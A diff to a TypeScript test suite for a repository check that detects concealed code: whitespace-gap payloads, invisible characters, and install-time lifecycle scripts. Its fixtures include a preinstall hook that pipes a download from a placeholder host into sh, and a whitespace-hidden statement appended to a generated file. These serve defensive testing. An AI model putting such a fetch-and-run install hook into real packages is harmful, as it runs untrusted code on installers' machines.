@@ -36,6 +36,8 @@ const RLO = String.fromCharCode(0x202e);
 const SHRUG = String.fromCodePoint(0x1f937);
 const MALE_SIGN = String.fromCharCode(0x2642);
 const VS16 = String.fromCharCode(0xfe0f);
+const SOFT_HYPHEN = String.fromCharCode(0x00ad);
+const NUL = String.fromCharCode(0);
 
 interface Result {
   code: number;
@@ -59,7 +61,9 @@ async function runCheck(root: string, args: string[] = []): Promise<Result> {
 /** Build a synthetic repo root from a path->contents map, run the gate, clean up. */
 async function withTree(
   files: Record<string, string>,
-  assertions: (result: Result) => void
+  // `void` alone would silently accept an async callback and drop its
+  // assertions — the test would pass no matter what it asserted.
+  assertions: (result: Result) => void | Promise<void>
 ): Promise<void> {
   const dir = await mkdtemp(join(tmpdir(), 'concealment-'));
   try {
@@ -68,7 +72,7 @@ async function withTree(
       await mkdir(join(path, '..'), { recursive: true });
       await writeFile(path, contents);
     }
-    assertions(await runCheck(dir));
+    await assertions(await runCheck(dir));
   } finally {
     await rm(dir, { recursive: true, force: true });
   }
@@ -144,6 +148,48 @@ describe('horizontal concealment', () => {
       expect(code).toBe(0)
     );
   });
+
+  test('exempts generated files from the long-line rule', async () => {
+    // src/core/graphql/operations.generated.ts is one string per operation and
+    // runs to ~1750 columns. It is machine-written and reviewed as a whole.
+    await withTree(
+      { 'src/ops.generated.ts': `export const Q = '${'x'.repeat(900)}';\n` },
+      ({ code }) => expect(code).toBe(0)
+    );
+  });
+
+  test('still applies the whitespace rule inside generated files', async () => {
+    // The long-line exemption must not become a hiding place: a gap-based
+    // payload appended to a generated file is still concealment.
+    await withTree(
+      { 'src/ops.generated.ts': `const Q = '';${' '.repeat(200)}globalThis.x = 1;\n` },
+      ({ code, stderr }) => {
+        expect(code).toBe(1);
+        expect(stderr).toContain('whitespace');
+      }
+    );
+  });
+});
+
+describe('scope', () => {
+  test('skips vendored directories', async () => {
+    await withTree({ 'node_modules/pkg/index.js': `eval(x);\n` }, ({ code }) =>
+      expect(code).toBe(0)
+    );
+  });
+
+  test('skips binary files rather than reporting noise from them', async () => {
+    // A NUL byte marks it binary; the soft hyphens after it would otherwise be
+    // reported as invisible characters on every line.
+    const binary = `PK${NUL}${NUL}${SOFT_HYPHEN.repeat(50)}`;
+    await withTree({ 'src/blob.json': binary }, ({ code }) => expect(code).toBe(0));
+  });
+
+  test('skips lockfiles, which are generated and covered by check:deps-pinned', async () => {
+    await withTree({ 'package-lock.json': `{"x":"${'A'.repeat(600)}"}\n` }, ({ code }) =>
+      expect(code).toBe(0)
+    );
+  });
 });
 
 describe('invisible characters', () => {
@@ -213,6 +259,14 @@ describe('install-time lifecycle scripts', () => {
   test('flags preinstall', async () => {
     const pkg = JSON.stringify({ scripts: { preinstall: 'curl https://x.example | sh' } });
     await withTree({ 'package.json': pkg }, ({ code }) => expect(code).toBe(1));
+  });
+
+  test('flags prepublish, the deprecated hook that also ran on install', async () => {
+    const pkg = JSON.stringify({ scripts: { prepublish: 'node build.js' } });
+    await withTree({ 'package.json': pkg }, ({ code, stderr }) => {
+      expect(code).toBe(1);
+      expect(stderr).toContain('prepublish');
+    });
   });
 
   test('allows the husky prepare hook this repo actually uses', async () => {
